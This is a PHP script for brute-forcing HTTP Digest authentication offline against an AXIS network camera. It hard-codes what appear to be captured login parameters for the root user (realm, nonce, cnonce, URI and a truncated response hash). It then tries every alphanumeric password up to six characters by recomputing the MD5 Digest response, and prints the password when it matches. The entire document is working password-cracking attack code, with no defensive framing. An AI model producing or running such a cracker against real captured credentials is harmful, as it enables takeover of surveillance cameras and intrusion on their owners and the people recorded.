<?PHP
 // Digest Bruceforce offline for AXIS Camera
 $user      = "root";
 $method    = "GET";
 $realm     = "AXIS_XXXXXXXXXX";
 $uri       = "/view/view.shtml?id=1&imagepath=%2Fmjpg%2Fvideo.mjpg&size=1";
 $nonce     = "beQyrCkXBQA=97c2a0ff222bde9437afac92d3d9e0e5933bed8f";
 $cnonce    = "f44d1efcb1eb1068158d3e5029566a1a";
 $nc        = "00000001";
 $qop       = "auth";
 $resp      = "b8435d7fd0a4578d4086001f8f......";

 $charSet   = "0123456789";
 $charSet  .= "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
 $charSet  .= "abcdefghijklmnopqrstuvwxyz";
 $maxLength = 6;

 // Engine
 $size = strlen($charSet);
 $base = array();
 $counter = 0;
 $baseSize = 1;
 while($baseSize <= $maxLength) {
  for($i = 0; $i < $size; $i++) {
   $base[0] = $i;
   $pass = "";
   for($j = $baseSize - 1; $j >= 0; $j--) {
    $pass .= $charSet[$base[$j]];
   }
   $hash1    = md5("$user:$realm:$pass");
   $hash2    = md5("$method:$uri");
   $response = md5("$hash1:$nonce:$nc:$cnonce:$qop:$hash2");
   if($response == $resp) { exit("Pass: $pass\n"); }
  }
  for($i = 0; $i < $baseSize; $i++) {
   if($base[$i] == $size-1) $counter++;
   else break;
  }
  if($counter == $baseSize) {
   for($i=0; $i <= $baseSize; $i++) {
    $base[$i] = 0;
   }
   $baseSize = count($base);
  } else {
   $base[$counter]++;
   for($i=0; $i < $counter; $i++) $base[$i] = 0;
  }
  $counter = 0;
 }
?>
